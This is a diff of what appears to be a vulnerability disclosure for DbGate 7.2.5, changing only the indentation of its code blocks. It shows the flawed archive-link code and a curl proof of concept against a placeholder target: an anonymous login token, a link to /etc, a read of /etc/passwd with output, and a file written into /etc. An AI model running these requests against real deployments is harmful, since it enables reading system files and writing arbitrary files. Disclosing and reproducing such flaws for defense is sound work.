@@ -24,11 +24,11 @@ In `packages/api/src/controllers/archive.js`, `createLink` only validates the ba
 ```javascript
 createLink_meta: true,
 async createLink({ linkedFolder }) {
-    assertSafeArchiveName(path.parse(linkedFolder).name, 'linkedFolder');  // Only checks basename!
-    const folder = await this.getNewArchiveFolder({ database: path.parse(linkedFolder).name + '.link' });
-    await fs.writeFile(path.join(archivedir(), folder), linkedFolder);  // Writes full path, e.g., /etc
-    clearArchiveLinksCache();
-    return folder;
+ assertSafeArchiveName(path.parse(linkedFolder).name, 'linkedFolder'); // Only checks basename!
+ const folder = await this.getNewArchiveFolder({ database: path.parse(linkedFolder).name + '.link' });
+ await fs.writeFile(path.join(archivedir(), folder), linkedFolder); // Writes full path, e.g., /etc
+ clearArchiveLinksCache();
+ return folder;
 }
 ```
 
@@ -36,13 +36,13 @@ async createLink({ linkedFolder }) {
 
 ```javascript
 function resolveArchiveFolder(folder) {
-    if (folder.endsWith('.link')) {
-        if (!archiveLinksCache[folder]) {
-            archiveLinksCache[folder] = fs.readFileSync(path.join(archivedir(), folder), 'utf-8');
-        }
-        return archiveLinksCache[folder];  // Returns attacker-controlled path, e.g., /etc
-    }
-    return path.join(archivedir(), folder);
+ if (folder.endsWith('.link')) {
+ if (!archiveLinksCache[folder]) {
+ archiveLinksCache[folder] = fs.readFileSync(path.join(archivedir(), folder), 'utf-8');
+ }
+ return archiveLinksCache[folder]; // Returns attacker-controlled path, e.g., /etc
+ }
+ return path.join(archivedir(), folder);
 }
 ```
 
@@ -65,8 +65,8 @@ Verified on DbGate 7.2.5 Docker (default anonymous deployment, port 3000):
 
 ```bash
 curl -s -X POST http://TARGET:3000/auth/login \
-  -H "Content-Type: application/json" \
-  -d '{"amoid":"none"}'
+ -H "Content-Type: application/json" \
+ -d '{"amoid":"none"}'
 ```
 ```
 {"accessToken":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhbW9pZCI6Im5vbmUiLCJpYXQiOjE3ODY2Nzc0NDMsImV4cCI6MTc4Njc2Mzg0M30.1Wx405Tl_uknYkIUujwhRQ5nciP5KNkekHsDKGqnInI"}
@@ -76,9 +76,9 @@ curl -s -X POST http://TARGET:3000/auth/login \
 
 ```bash
 curl -s -X POST http://TARGET:3000/archive/create-link \
-  -H "Authorization: Bearer <JWT>" \
-  -H "Content-Type: application/json" \
-  -d '{"linkedFolder":"/etc"}'
+ -H "Authorization: Bearer <JWT>" \
+ -H "Content-Type: application/json" \
+ -d '{"linkedFolder":"/etc"}'
 ```
 ```
 "etc3.link"
@@ -88,9 +88,9 @@ curl -s -X POST http://TARGET:3000/archive/create-link \
 
 ```bash
 curl -s -X POST http://TARGET:3000/files/load \
-  -H "Authorization: Bearer <JWT>" \
-  -H "Content-Type: application/json" \
-  -d '{"folder":"archive:etc.link","file":"passwd","format":"text"}'
+ -H "Authorization: Bearer <JWT>" \
+ -H "Content-Type: application/json" \
+ -d '{"folder":"archive:etc.link","file":"passwd","format":"text"}'
 ```
 ```
 root:x:0:0:root:/root:/bin/bash
@@ -103,9 +103,9 @@ bin:x:2:2:bin:/bin:/usr/sbin/nologin
 
 ```bash
 curl -s -X POST http://TARGET:3000/files/save \
-  -H "Authorization: Bearer <JWT>" \
-  -H "Content-Type: application/json" \
-  -d '{"folder":"archive:etc.link","file":"dbgate_poc.txt","data":"PWNED","format":"text"}'
+ -H "Authorization: Bearer <JWT>" \
+ -H "Content-Type: application/json" \
+ -d '{"folder":"archive:etc.link","file":"dbgate_poc.txt","data":"PWNED","format":"text"}'
 ```
 ```
 true
